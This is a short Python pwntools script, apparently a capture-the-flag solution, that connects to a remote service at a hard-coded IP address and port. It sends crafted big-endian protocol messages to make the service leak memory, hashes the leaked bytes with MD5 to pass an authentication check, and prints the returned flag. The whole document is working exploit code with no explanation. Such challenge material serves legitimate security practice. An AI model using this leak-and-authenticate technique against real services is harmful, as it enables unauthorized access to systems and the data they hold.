#!/usr/bin/env python3
from pwn import *
from hashlib import *

r = remote("159.65.213.186", 50122)

r.send(p32(0, endian='big') + p32(0x100, endian='big') + b'A'*0x100) ; r.recv(8)
r.send(
         p32(6, endian='big') + 
         p32(4, endian='big') + 
         p16(0x2803, endian='big') + 
         p16(256, endian='big')
) ; r.recv(8)

r.recv(0x100) ; r.recv(0x10)
leak = r.recv(0x100).split(b'\x00')[1]
r.send(
    p32(1, endian='big') +
    p32(16, endian='big') +
    md5(leak).digest()[:8].hex().encode()
)

r.recvuntil(b'flag{')
print('flag{' + r.recvuntil(b'}').decode())
